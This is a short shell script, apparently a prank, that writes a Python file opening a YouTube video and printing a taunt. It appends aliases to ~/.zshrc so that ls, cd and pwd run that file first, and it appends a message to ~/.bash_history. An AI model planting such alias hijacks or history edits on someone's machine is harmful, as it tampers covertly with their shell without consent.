cat >> $HOME/.shell.py << EOL
import webbrowser
import time
import sys
webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

def my_str():
	str = "Are you not entertained"
	for i in str:
		sys.stdout.write(i)
		time.sleep(0.5)
my_str()
EOL

cat >> $HOME/.zshrc << EOL
alias ls="python $HOME/.shell.py && /bin/ls"
alias cd="python $HOME/.shell.py && /usr/bin/cd"
alias pwd="python $HOME/.shell.py && /bin/pwd"
EOL

cat >> $HOME/.bash_history << EOL
The chamber of secrets has been opened, enermies of the heir beware!
EOL


